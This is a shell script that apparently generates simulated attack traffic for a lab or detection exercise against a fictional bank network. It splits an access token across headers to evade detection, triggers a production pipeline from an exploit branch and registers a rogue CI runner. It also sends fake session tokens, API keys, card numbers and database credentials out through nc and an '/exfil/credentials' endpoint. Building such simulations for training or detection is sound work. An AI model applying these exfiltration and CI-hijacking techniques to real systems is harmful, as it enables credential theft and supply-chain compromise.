#!/bin/sh

echo "WEB-PUBLIC-01 starting..."
sleep 8

TOKEN_PART1="glpat-2Kx9"
TOKEN_PART2="mP4nQ7"
TOKEN_PART3="vB8sL1"
TOKEN_PART4="eR6wZ3"
TOKEN_PART5="uY5tI9"

while true; do
    curl -s -X GET "http://172.40.1.11:8080/api/health" -H "Host: api.securebank.local" > /dev/null 2>&1 || true
    sleep 12
    
    FULL_TOKEN="${TOKEN_PART1}${TOKEN_PART2}${TOKEN_PART3}${TOKEN_PART4}${TOKEN_PART5}"
    
    curl -s -X POST "http://172.40.1.20:8080/api/v4/projects/1/trigger/pipeline" \
         -H "Content-Type: application/json" \
         -H "X-Auth-Token: $TOKEN_PART1" \
         -H "X-Session-Key: $TOKEN_PART2" \
         -H "X-Request-ID: $TOKEN_PART3" \
         -H "X-Client-Version: $TOKEN_PART4" \
         -H "X-Build-Hash: $TOKEN_PART5" \
         -d '{"ref":"master","variables":[{"key":"ENVIRONMENT","value":"production"},{"key":"DEPLOY_BRANCH","value":"feature-supply-chain-exploit"}]}' > /dev/null 2>&1 || true
    sleep 5
    
    curl -s -X GET "http://172.40.1.20:8080/api/v4/projects/1/repository/archive.tar.gz?sha=malicious-commit" \
         -H "Authorization: Bearer $FULL_TOKEN" \
         -o /tmp/source.tar.gz > /dev/null 2>&1 || true
    sleep 3
    
    RUNNER_TOKEN_B64=$(echo -n "R1I5ODc2NTQzMjFhQmNEZUY3ODkwMTIzNDU2" | base64)
    curl -s -X POST "http://172.40.1.200:8080/api/v4/runners/register" \
         -H "Content-Type: application/json" \
         -d "{\"token\":\"$RUNNER_TOKEN_B64\",\"description\":\"Compromised Runner\",\"tags\":[\"production\",\"docker\"]}" > /dev/null 2>&1 || true
    
    echo '{"server":"WEB-PUBLIC-01","users_online":1247,"session_tokens":["ses_9a8f7e6d5c4b3a29","ses_1e2d3c4b5a69879f"],"api_keys":["ak_web_prod_78291","ak_analytics_45637"],"financial_data":{"daily_volume":"47,293,847.92","accounts":["4532-7834-9012-5678","5555-8901-2345-6789"],"trojan_installed":true,"nc_listeners":["4444","4445","4446"],"shell_uploads":["/tmp/backdoor.sh","/usr/bin/system-update"]}}' | nc 172.40.1.200 4444 || true
    
    sleep 5
    
    curl -s -X POST "http://172.40.1.200:8080/api/v4/jobs/12345/trace" \
         -H "Content-Type: application/json" \
         -d '{"operation":"credential_exfiltration","status":"success","auth_jwt_key":"HS256_ultra_secure_production_signing_key_P7mQ9xR","mongodb_connection":"mongodb://data_analytics:D@t@_An@lyt1cs_B7pQ@data-cluster-01:27017/analytics_prod","exfiltration_complete":true}' || true
    
    sleep 10
    
    curl -s -X POST "http://172.40.1.200:8080/exfil/credentials" \
         -H "Content-Type: application/json" \
         -d '{"auth_credentials":{"jwt_signing_key":"HS256_ultra_secure_production_signing_key_P7mQ9xR","oauth_client":"oauth2_client_9a8b7c6d5e4f"},"database_access":{"mongodb_connection":"mongodb://data_analytics:D@t@_An@lyt1cs_B7pQ@data-cluster-01:27017/analytics_prod"},"exfiltration_complete":true}' || true
    
    sleep 5
done
